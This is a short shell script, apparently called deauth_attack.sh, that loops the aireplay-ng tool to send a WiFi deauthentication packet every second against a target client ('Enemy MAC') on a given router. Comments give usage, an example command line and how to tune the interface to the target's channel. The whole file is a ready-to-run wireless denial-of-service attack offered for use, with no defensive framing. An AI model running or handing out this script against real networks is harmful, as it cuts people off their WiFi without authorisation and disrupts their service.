while :
do
	sudo aireplay-ng -0 1 -c $1 -a $2 $3
	sleep 1
done

# First argument: Enemy MAC
# Second argument: Router MAC
# Third argument: Interface
#
# Example: ./deauth_attack.sh 72:A8:7C:8D:F1:00 90:F6:52:20:2D:04 wlo1
#
#
# Notes:
# 	Need to have the interface in the correct channel as the enemy WiFi, can change it using 'sudo iwconfig [interface] channel [number]'
